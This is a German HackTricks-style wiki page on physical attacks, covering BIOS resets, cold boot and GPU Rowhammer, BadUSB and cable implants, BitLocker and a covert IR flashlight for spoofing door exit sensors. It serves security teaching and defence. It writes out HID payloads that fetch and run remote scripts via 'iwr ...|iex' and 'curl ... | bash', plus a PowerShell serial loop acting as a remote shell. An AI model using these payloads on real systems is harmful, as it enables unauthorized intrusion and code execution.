# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

## BIOS-Passwortwiederherstellung und Systemsicherheit

Einstellungen in älterer PC-Firmware lassen sich möglicherweise zurücksetzen, indem die CMOS-Batterie getrennt oder ein dokumentierter Clear-CMOS-Jumper verwendet wird. Die erforderliche Dauer ohne Stromversorgung ist boardspezifisch. Moderne UEFI-Passwörter oder -Schlüssel können im nichtflüchtigen Flash-Speicher, in einem Embedded Controller oder in einem Sicherheitsgerät gespeichert sein und daher auch nach dem Entfernen der Batterie bestehen bleiben. Ziehe vor dem Überbrücken von Pins das Handbuch des Boards oder Servicehandbuch zu Rate. Dieses Verfahren kann außerdem TPM-Messwerte ungültig machen und eine Wiederherstellung der Festplattenverschlüsselung auslösen.

Auf älteren x86-Systemen können Tools wie **killCMOS** und **CmosPwd** CMOS-gesicherte Einstellungen in einer bootfähigen Umgebung auslesen oder ändern. CmosPwd erkennt Passwortformate einer dokumentierten Auswahl älterer BIOS-Familien und kann den CMOS-Zustand sichern, wiederherstellen oder löschen/killen. Die veröffentlichten Builds zielen auf ältere DOS-/Windows-, Linux-, FreeBSD- und NetBSD-Umgebungen ab.<sup>[[18]](#references)</sup> Diese Dienstprogramme sind keine universellen Tools zum Entfernen von UEFI-Passwörtern und erfordern ausreichenden Zugriff auf Hardware und Firmware.

Bei manchen Laptop-Firmwares wird nach mehreren fehlgeschlagenen Passwortversuchen ein herstellerspezifischer Challenge-Code angezeigt. Datenbanken wie [bios-pw.org](https://bios-pw.org) können für einige Modelle ältere Hersteller-Wiederherstellungspasswörter ableiten, aber viele Systeme sperren den Zugriff, ohne dass sich ein Passwort aus einer Challenge ableiten lässt. Behandle jedes generierte Passwort als modellspezifisch und vermeide es, permanente Versuchsbegrenzungen auszuschöpfen.

### UEFI-Sicherheit

Bei modernen **UEFI**-Systemen kann CHIPSEC den Schutz von Secure-Boot-Variablen prüfen. Beginne mit der unten aufgeführten Prüfung, die keine Änderungen vornimmt. Der optionale Modus `-a modify` versucht absichtlich, Variablen zu beschädigen, und sollte nur auf einem wiederherstellbaren Laborsystem verwendet werden. CHIPSEC selbst warnt davor, dass sein privilegierter Treiber und der Low-Level-Hardwarezugriff für produktive Endgeräte ungeeignet sind.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-Analyse und Cold-Boot-Angriffe

DRAM verliert nicht sofort jedes Bit, sobald die Refresh-Zyklen ausbleiben. Die Zerfallsrate hängt stark von der Modultechnologie und der Temperatur ab; Kühlung kann nützliche Daten deutlich länger erhalten als ein nicht gekühlter Stromausfall. Bei einem Cold-Boot-Angriff wird das System schnell in eine kleine Erfassungsumgebung neu gestartet oder ein gekühltes Modul umgesetzt, der rohe Speicher erfasst und trotz Bitzerfall werden kryptografische Schlüssel rekonstruiert. Ein Dienstprogramm zum Kopieren von Datenträgern ist nicht automatisch ein Werkzeug zur Erfassung des physischen Speichers, und Volatility analysiert eine Erfassung, statt sie durchzuführen. Verwende ein plattformgeeignetes, validiertes Erfassungstool.<sup>[[12]](#references)</sup>

---

## GPU-Rowhammer gegen Seitentabellen

Moderne GPU-Rowhammer-Angriffe sind deutlich nützlicher, wenn sie **Metadaten des virtuellen GPU-Speichers** statt gewöhnlicher Puffer angreifen. Aktuelle Forschung zu **GDDR6-NVIDIA-Ampere-GPUs** zeigt, dass ein Angreifer mit nicht privilegiertem CUDA-Code GPU-spezifische Hammering-Muster erstellen, mithilfe von **Memory Massaging** Paging-Strukturen in anfälligen Zeilen platzieren und dann Bits in der **Seitentabelle der letzten Ebene** oder einem zwischengeschalteten **Seitenverzeichnis** kippen kann. Sobald ein einzelner Übersetzungseintrag beschädigt ist, kann der Angreifer **beliebige GPU-Speicher-Lese-/Schreibzugriffe** ermöglichen und anschließend zur Kompromittierung des Hosts übergehen.<sup>[[1]](#references)[[2]](#references)</sup>

### Angriffsmuster

1. **Hammerbare Zeilen profilieren** in GDDR6 und refresh-bewusste, nicht uniforme Hammering-Muster erstellen, die In-DRAM-Gegenmaßnahmen umgehen.
2. **GPU-Allokationen massieren**, sodass der Treiber Übersetzungsstrukturen für Seiten in hammerbaren physischen Bereichen platziert, statt sie im standardmäßig geschützten Pool zu belassen. In der Praxis kann das bedeuten, den Bereich für Seitentabellen im niedrigen Speicher auszuschöpfen und große, dünn besetzte UVM-Zuordnungen mit kontrollierten Abständen zu streuen.
3. **Übersetzungsmetadaten kippen**, etwa **PFN**- oder aperturebezogene Bits in einem Seitentabellen- oder Seitenverzeichniseintrag, sodass die vom Angreifer kontrollierte virtuelle Seite auf Seitentabellenseiten, beliebigen GPU-Speicher oder für den Host sichtbare Systemzuordnungen verweist.
4. Die gefälschte Zuordnung wiederverwenden, um weitere Übersetzungseinträge zu überschreiben und **beliebige GPU-Speicher-Lese-/Schreibzugriffe** über GPU-Kontexte hinweg zu erlangen.

### Host-Pivot und Gegenmaßnahmen

- Bei **deaktiviertem IOMMU** können gefälschte System-Aperture-Zuordnungen beliebigen **physischen Host-Speicher** für die GPU zugänglich machen und so aus der GPU-Primitive eine vollständige Host-Kompromittierung machen.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** zielt auf Seitentabelleneinträge der letzten Ebene, während **GeForge** zeigt, dass sich eine Ebene des Seitenverzeichnisses leichter beschädigen lässt, da ein einzelner Bit-Flip einen größeren Übersetzungs-Teilbaum umlenken kann. Betrachte nicht nur eine Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** ist weiterhin wichtig, weil sie den direkten Zugriff auf beliebigen Host-Speicher verhindert, den GDDRHammer/GeForge nutzen. Sie ist jedoch **keine vollständige Gegenmaßnahme**. **GPUBreach** zeigt einen Pivot in einer zweiten Stufe: Der Angreifer beschädigt GPU-beschreibbare, dem Treiber gehörende CPU-Puffer und löst dann Speicherfehler im NVIDIA-Treiber aus, um eine Kernel-Schreib-Primitive und eine **Root-Shell** zu erhalten – selbst bei aktiviertem IOMMU.<sup>[[3]](#references)</sup>
- **Systemweites ECC** ist eine praktikable Härtungsmaßnahme bei unterstützten Workstation-/Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Abwehr.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bit-Flips auf einer RTX 3060 und **202** auf einer RTX A6000. Das reichte aus, um eine funktionierende Kette zur Erhöhung der Host-Berechtigungen aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct-Memory-Access-(DMA-)Angriffe

Informationen zum Offline-Patching von UEFI IFR/NVRAM, mit dem die IOMMU-Durchsetzung vor dem Booten herabgestuft und eine Windows-DMA-Angriffskette ermöglicht werden kann, findest du hier:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstriert **DMA-basierte Speichererfassung und -manipulation** über Schnittstellen wie FireWire und frühe Thunderbolt-Konfigurationen, einschließlich historischer Signaturen zum Umgehen der Anmeldung. Es ist nicht einfach „unter Windows 10 wirkungslos“: Die Ausnutzbarkeit hängt von der Schnittstelle, dem Ziel-Build, der IOMMU-Richtlinie, dem Sperrzustand sowie davon ab, ob Windows Kernel DMA Protection unterstützt und aktiviert ist. Windows 10 Version 1803 und höher führte Kernel DMA Protection auf kompatiblen Plattformen ein und veränderte damit die Angriffsfläche erheblich.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live-CD/USB für Systemzugriff

Bei einem unverschlüsselten oder bereits entsperrten Windows-Volume kann eine Offline-Umgebung Eingabehilfen-Binärdateien wie **sethc.exe** oder **Utilman.exe** durch **cmd.exe** ersetzen. Dadurch lässt sich eine SYSTEM-Eingabeaufforderung öffnen, wenn die entsprechende Tastenkombination auf dem Anmeldebildschirm ausgeführt wird. Tools wie **chntpw** können lokale SAM-Kontodaten bearbeiten. Diese Methoden umgehen kein gesperrtes BitLocker-Volume und können durch DPAPI/EFS geschützte Anmeldedaten beschädigen. Bewahre forensische Kopien und Sicherungen auf.

**Kon-Boot** ist ein kommerzielles Tool zum Umgehen der Authentifizierung beim Systemstart für unterstützte Windows-/macOS-Konfigurationen. Die Kompatibilität hängt vom Betriebssystem, Firmware-Modus, Secure Boot und der Datenträgerverschlüsselung ab. Es entschlüsselt kein gesperrtes BitLocker-Volume.<sup>[[10]](#references)</sup>

---

## Umgehen von Windows-Sicherheitsfunktionen

### Start- und Wiederherstellungsverknüpfungen

- **Entf/Supr**, F2, F10 oder eine andere herstellerspezifische Taste öffnet möglicherweise das Firmware-Setup.
- **F8** öffnet die erweiterten Startoptionen älterer Windows-Versionen nur bei Konfigurationen, in denen dieser Weg weiterhin aktiviert ist. Der aktuelle Zugriff auf die Wiederherstellungsumgebung variiert.
- Durch Gedrückthalten von **Shift** lässt sich die automatische Windows-Anmeldung bei manchen Konfigurationen unterdrücken; Richtlinien- oder Registrierungseinstellungen können dieses Verhalten jedoch deaktivieren.<sup>[[17]](#references)</sup>

### BAD-USB-Geräte

Geräte wie **USB Rubber Ducky** und Teensy-Boards können sich als vertrauenswürdige HID-Tastaturen anmelden und vordefinierte Tastatureingaben einspeisen. Die Payload verfügt zunächst über die Berechtigungen und den Desktopzugriff der angemeldeten Sitzung. UAC-Abfragen, Bildschirmsperren, Tastaturlayout, Timing und USB-Richtlinien für Endgeräte setzen ihr weiterhin Grenzen.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrations- oder Sicherungsberechtigungen ermöglichen das Erstellen einer Shadow Copy oder das Speichern von Registrierungs-Hives, sodass gesperrte Dateien wie **SAM** und **SYSTEM** erfasst werden können. Dies ist eine Technik zur Datensammlung nach einer Kompromittierung, keine Umgehung von Berechtigungen. Sie sollte mit Ereignissen zu `diskshadow`/VSS und zum Export von Registrierungs-Hives abgeglichen werden.

## BadUSB-/HID-Implantat-Techniken

### Android-HID-Gadget mit NFC-Auslösung

Ein gerootetes Android-Telefon kann nur dann zu einer programmierbaren USB-Tastatur werden, wenn USB-Controller und Kernel **USB-Gadget-/HID-Unterstützung** bieten. Auf kompatiblen Geräten stellt Kali NetHunter über **USB Arsenal** Gadget-Profile bereit. Eine weitere Option ist [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), das ConfigFS-Gadget-Funktionen erstellt und möglicherweise Tastatur-/Maus-Zeichengeräte wie `/dev/hidg0` und `/dev/hidg1` bereitstellt. Das Tool erstellt lediglich den Gadget-Endpunkt; ein separater Prozess muss HID-Berichte an diesen Endpunkt schreiben. Root-Zugriff kann fehlendes ConfigFS, fehlende HID-Gadget-Unterstützung oder einen nicht nutzbaren USB Device Controller im Kernel nicht ausgleichen.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Dieser Endpunkt lässt sich mit Android-NFC als physischem Auslöser kombinieren. Die App [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) liest die UID eines Tags, wandelt sie in das erwartete Format um, prüft sie anhand einer lokalen Whitelist und sendet bei Übereinstimmung eine konfigurierte Tastatursequenz im Rubber-Ducky-Stil. Der verbundene Host sieht gewöhnliche Tastatureingaben und benötigt keine NFC-Software.<sup>[[22]](#references)[[24]](#references)</sup>

Prüfe die Geräteerkennung und das Tastaturlayout in einem leeren Texteditor, bevor du Tastenkombinationen oder Befehle verwendest. Eine harmlose Payload lautet:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Wichtige Vertrauensgrenzen:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Eine **UID-Whitelist dient der Identifizierung, nicht der Authentifizierung**. UIDs sind öffentlich, und einige Token-Typen oder Emulatoren erlauben Klonen oder Identitätsvortäuschung. Eine kopierte zulässige UID durchläuft denselben Dispatch-Pfad wie das Original-Token.
- Das **NfcScreenOff**-Magisk-Modul patcht den NFC-Dienst, sodass dieser sich verhält, als wäre der Bildschirm eingeschaltet und entsperrt. Ist das Telefon bereits mit einem Host verbunden, kann dadurch jemand die Payload auslösen, ohne das Telefon zu entsperren.
- Passwörter, API-Tokens und in der Payload gespeicherte Befehle sind wiederherstellbare Geheimnisse auf einem gerooteten Gerät oder einem Gerät mit entsperrtem Bootloader. Ein Passwort per HID einzugeben ist die Automatisierung der Wiederverwendung eines Passworts, keine passwortlose Authentifizierung.
- HID-Injection wird mit den Berechtigungen des aktiven Desktops ausgeführt und hängt vom Fokus, Timing und Tastaturlayout des Hosts ab. Verlange vor dem Ausführen sensibler Aktionen eine aktuelle Bestätigung des Benutzers, vermeide privilegierte Geheimnisse in Skripten und verwende für echte Authentifizierung einen kryptografischen Challenge-Response-Authenticator.

### Wi-Fi-gesteuerte Kabelimplantate

- ESP32-S3-basierte Implantate wie **Evil Crow Cable Wind** verbergen sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, melden sich ausschließlich als USB-Tastatur an und stellen ihren C2-Stack über Wi-Fi bereit. Der Operator muss das Kabel nur über den Host des Opfers mit Strom versorgen, einen Hotspot mit dem Namen `Evil Crow Cable Wind` und dem Passwort `123456789` einrichten und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.<sup>[[8]](#references)</sup>
- Die Browseroberfläche bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads sind nach Betriebssystem gekennzeichnet, Tastaturlayouts lassen sich im laufenden Betrieb wechseln und VID/PID-Zeichenfolgen können geändert werden, um bekannte Peripheriegeräte nachzuahmen.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads bereitstellen, deren Ausführung auslösen und Wi-Fi-Zugangsdaten verwalten, ohne das Netzwerk der Organisation zu verwenden – nützlich bei physischen Eindringversuchen mit kurzer Verweildauer.

### Betriebssystemabhängige AutoExec-Payloads

- AutoExec-Regeln verknüpfen eine oder mehrere Payloads, die unmittelbar nach der USB-Anmeldung ausgeführt werden. Das Implantat führt eine einfache Betriebssystemerkennung durch und wählt das passende Skript aus.
- Beispielablauf:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann schon der Austausch eines Ladekabels einen „Plug-and-pwn“-Erstzugriff im Kontext des angemeldeten Benutzers ermöglichen.

### Über HID gestartete Remote-Shell über Wi-Fi-TCP

1. **Tastatur-Bootstrap:** Eine gespeicherte Payload öffnet eine Konsole und fügt eine Schleife ein, die ausführt, was über das neue USB-Seriellgerät eingeht. Eine einfache Windows-Variante lautet:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kabelbrücke:** Das Implantat hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktopprogramm) startet, der eine Verbindung zum Operator herstellt. Alle in die TCP-Sitzung eingegebenen Bytes werden in die obige serielle Schleife weitergeleitet. Dadurch ist auch auf air-gapped Hosts die Remote-Codeausführung möglich. Die Ausgabe ist begrenzt, daher führen Operatoren typischerweise Befehle ohne Rückmeldung aus (Erstellen von Konten, Bereitstellen zusätzlicher Tools usw.).

### HTTP-OTA-Update-Oberfläche

- Die dokumentierte Evil Crow Cable-Schnittstelle bietet unter `/update` einen nicht authentifizierten Firmware-Update-Endpunkt:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Außendienstmitarbeiter können Funktionen im laufenden Einsatz per Hot-Swap wechseln (z. B. USB-Army-Knife-Firmware flashen), ohne das Kabel zu öffnen. So kann das Implantat neue Fähigkeiten nutzen, während es weiterhin mit dem Zielhost verbunden ist.

## BitLocker-Verschlüsselung umgehen

Eine autorisierte forensische Erfassung eines laufenden oder kürzlich verwendeten Systems kann einen BitLocker-Volume-Master-Key oder verwandtes Schlüsselmaterial enthalten, solange das Volume entsperrt ist. Kommerzielle Tools wie Elcomsoft Forensic Disk Decryptor und Passware Kit Forensic können unterstützte Speicherabbilder, Ruhezustandsdateien oder Crash-Dumps durchsuchen; der Erfolg ist jedoch nicht garantiert. Moderne Windows-Versionen verschlüsseln Crash-Dumps zudem, wenn BitLocker aktiviert ist. Ein gespeichertes 48-stelliges Wiederherstellungspasswort ist ein anderes Artefakt als ein In-Memory-Volume-Key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein Angreifer, der einen Administrator dazu bringt, BitLocker-Verwaltungsbefehle auszuführen, kann einen Wiederherstellungspasswort-, externen Schlüssel- oder anderen Protector hinzufügen und anschließend abgreifen. Ein Wiederherstellungspasswort kann keine beliebige Folge aus Nullen sein: Numerische BitLocker-Wiederherstellungspasswörter müssen einem validierten 48-stelligen Format entsprechen. Die relevante Syntax für die autorisierte Verwaltung lautet `manage-bde -protectors -add C: -recoverypassword`; die hinzugefügten Protectors lassen sich mit `manage-bde -protectors -get C:` auflisten. Überwachen Sie das Hinzufügen von Protectors und stellen Sie sicher, dass neues Wiederherstellungsmaterial ausschließlich an genehmigten Speicherorten hinterlegt wird.<sup>[[16]](#references)</sup>

---

## BIOS auf Werkseinstellungen zurücksetzen durch Ausnutzen von Gehäuseöffnungs- / Wartungsschaltern

Viele moderne Laptops und Small-Form-Factor-Desktops verfügen über einen **Gehäuseöffnungsschalter**, der vom Embedded Controller (EC) und der BIOS-/UEFI-Firmware überwacht wird. Der Hauptzweck des Schalters besteht zwar darin, beim Öffnen eines Geräts einen Alarm auszulösen, doch manche Hersteller implementieren eine **nicht dokumentierte Wiederherstellungs-Shortcut**, die bei einem bestimmten Schaltmuster ausgelöst wird.<sup>[[5]](#references)[[6]](#references)</sup>

### So funktioniert der Angriff

1. Der Schalter ist mit einem **GPIO-Interrupt** am EC verbunden.
2. Die auf dem EC laufende Firmware erfasst **Zeitabstände und Anzahl der Betätigungen**.
3. Wird ein fest codiertes Muster erkannt, ruft der EC eine *mainboard-reset*-Routine auf, die **den Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Start laden betroffene Modelle den zurückgesetzten Firmwarezustand. Je nach Hersteller und Revision kann der gelöschte Zustand ein Supervisor-Passwort, benutzerdefinierte Starteinstellungen oder hinterlegte Secure-Boot-Schlüssel umfassen. Auswirkungen auf den TPM-Zustand und die Festplattenverschlüsselung müssen separat geprüft werden.

> Ein Firmware-Reset kann externe Boot-Optionen wiederherstellen, entschlüsselt aber **keine** Datenträger. BitLocker oder ein anderes System zur vollständigen Festplattenverschlüsselung kann nach Änderungen am TPM oder an der Firmware in den Wiederherstellungsmodus wechseln und das interne Laufwerk weiterhin ohne Wiederherstellungsschlüssel schützen.<sup>[[16]](#references)</sup>

### Beispiel aus der Praxis – Framework 13 Laptop

Der Wiederherstellungs-Shortcut für das Framework 13 (11./12./13. Generation) lautet:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nach dem zehnten Zyklus setzt der EC ein Flag, das das BIOS anweist, beim nächsten Neustart den NVRAM zu löschen. Der gesamte Vorgang dauert etwa 40 Sekunden und erfordert **nichts außer einem Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeines Exploitationsverfahren

1. Schalte das Zielgerät ein oder versetze es in den Ruhezustand und reaktiviere es, damit der EC läuft.
2. Entferne die Bodenabdeckung, um den Intrusion-/Wartungsschalter freizulegen.
3. Führe das herstellerspezifische Schaltmuster aus (konsultiere die Dokumentation oder Foren oder untersuche die EC-Firmware per Reverse Engineering).
4. Baue das Gerät wieder zusammen, starte es neu und prüfe, welche Firmware-Einstellungen und Zugangsdaten sich tatsächlich geändert haben.
5. Falls autorisiert und externes Booten möglich ist, starte ein kontrolliertes Live-Image. Sobald ein internes Volume legitim entsperrt wurde (oder nie verschlüsselt war), kann die Live-Umgebung Zugangsdaten und Daten erfassen oder die EFI System Partition untersuchen. Das Ändern dieser Partition zur Installation eines EFI-Implants ist dauerhaft und äußerst invasiv und unterliegt weiterhin den Einschränkungen durch Secure Boot, gemessenes Booten, Firmware-Schreibschutz und Endpoint-Monitoring. Auf verschlüsselten Speicher kann ohne Schlüssel oder Wiederherstellungsmaterial nicht zugegriffen werden.

### Erkennung & Abwehr

* Protokolliere Gehäuseöffnungsereignisse in der OS-Verwaltungskonsole und korreliere sie mit unerwarteten BIOS-Resets.
* Verwende **manipulationssichere Siegel** an Schrauben und Abdeckungen, um ein Öffnen zu erkennen.
* Bewahre Geräte in **physisch gesicherten Bereichen** auf; gehe davon aus, dass physischer Zugriff einer vollständigen Kompromittierung gleichkommt.
* Deaktiviere, sofern verfügbar, die Funktion „maintenance switch reset“ des Herstellers oder verlange eine zusätzliche kryptografische Autorisierung für NVRAM-Resets.

---

## Verdeckte IR-Injektion gegen berührungslose Ausgangssensoren

### Sensoreigenschaften
- Gängige „wave-to-exit“-Sensoren kombinieren einen Nahinfrarot-LED-Sender mit einem TV-Fernbedienungsempfänger, der erst dann ein High-Signal ausgibt, wenn er mehrere Pulse (~4–10) mit der richtigen Trägerfrequenz (≈30 kHz) empfangen hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffblende verhindert, dass Sender und Empfänger direkt aufeinander gerichtet sind. Der Controller nimmt daher an, dass jedes erkannte Trägersignal von einer nahen Reflexion stammt, und schaltet ein Relais, das den Türöffner betätigt.
- Sobald der Controller davon ausgeht, dass sich ein Ziel in der Nähe befindet, ändert er häufig die Modulationshüllkurve des Sendesignals. Der Empfänger akzeptiert jedoch weiterhin alle Impulse, die zur gefilterten Trägerfrequenz passen.

### Angriffsablauf
1. **Emissionsprofil erfassen** – Schließe einen Logikanalysator an die Controller-Pins an, um sowohl die Wellenformen vor als auch nach der Erkennung aufzuzeichnen, die die interne IR-LED ansteuern.
2. **Nur die Wellenform „nach der Erkennung“ wiedergeben** – Entferne oder ignoriere den serienmäßigen Sender und steuere eine externe IR-LED von Anfang an mit dem bereits ausgelösten Muster an. Da für den Empfänger nur Pulsanzahl und Frequenz entscheidend sind, behandelt er das gefälschte Trägersignal wie eine echte Reflexion und aktiviert die Relaisleitung.
3. **Die Übertragung takten** – Sende das Trägersignal in abgestimmten Impulsfolgen (z. B. jeweils einige zehn Millisekunden an und ähnlich lange aus), um die Mindestpulszahl zu erreichen, ohne die AGC des Empfängers oder dessen Interferenzlogik zu übersteuern. Eine kontinuierliche Übertragung macht den Sensor schnell unempfindlich und verhindert, dass das Relais auslöst.

### Reflektierende Injektion über große Entfernung
- Der Austausch der Labor-LED gegen eine leistungsstarke IR-Diode mit MOSFET-Treiber und Fokussieroptik ermöglicht zuverlässiges Auslösen aus einer Entfernung von etwa 6 m.
- Der Angreifer benötigt keine direkte Sichtverbindung zur Empfängeröffnung. Wird der Strahl auf Innenwände, Regale oder Türrahmen gerichtet, die durch Glas sichtbar sind, kann reflektierte Energie in das Sichtfeld von etwa 30° eintreten und eine Handbewegung aus kurzer Entfernung nachahmen.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein wesentlich stärkerer externer Strahl von mehreren Oberflächen reflektiert werden und trotzdem über der Erkennungsschwelle bleiben.

### Zur Waffe umgebaute Angriffstaschenlampe
- Wird der Treiber in eine handelsübliche Taschenlampe eingebaut, ist das Werkzeug gut getarnt. Tausche die sichtbare LED gegen eine leistungsstarke IR-LED aus, die auf den Frequenzbereich des Empfängers abgestimmt ist, ergänze einen ATtiny412 (oder Ähnliches) zur Erzeugung der ≈30 kHz-Impulse und verwende einen MOSFET, um den LED-Strom zu schalten.
- Ein ausziehbares Zoomobjektiv bündelt den Strahl für größere Reichweite und Präzision. Ein vom MCU gesteuerter Vibrationsmotor bestätigt haptisch, dass die Modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Das Durchschalten mehrerer gespeicherter Modulationsmuster (mit leicht unterschiedlichen Trägerfrequenzen und Hüllkurven) verbessert die Kompatibilität mit verschiedenen umgelabelten Sensorfamilien. So kann der Operator reflektierende Flächen absuchen, bis das Relais hörbar klickt und die Tür entriegelt wird.

---

## References

- [1] [GDDRHammer: DRAM-Zeilen stark stören — Rowhammer-Angriffe über Komponentengrenzen hinweg mit modernen GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-Speicher bearbeiten, um GPU-Seitentabellen zu fälschen — zum Spaß und Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilegieneskalationsangriffe auf GPUs mithilfe von Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA – Sicherheitshinweis: Rowhammer – Juli 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Hier drücken, um zu pwnen“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anleitung zum Zurücksetzen des Mainboards](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Berührungslose IR-Ausgangssensoren mit einer verdeckten IR-Taschenlampe umgehen“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Einstecken, starten, pwnen: Hacking mit Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier – Rowhammer-Angriff auf NVIDIA-Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Offizielle Dokumentation und Kompatibilitätsinformationen zu Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC-Dokumentation – Schutz von Secure-Boot-Variablen](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Damit wir uns erinnern: Cold-Boot-Angriffe auf Verschlüsselungsschlüssel](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception – Manipulation des physischen Speichers über DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn – Kernel-DMA-Schutz](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentation zu Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn – BitLocker-Betriebsanleitung](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn – Verhalten beim Gedrückthalten der Umschalttaste und bei automatischer Anmeldung](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity – Dokumentation und Downloads zu CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali-Linux-Dokumentation – NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-Kernel-Dokumentation – USB-HID-Gadget-Treiber](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB-Gadget-Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Ein gerootetes Android-Telefon in einen NFC-Authentifikator und ein Automatisierungstool für den PC verwandeln](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
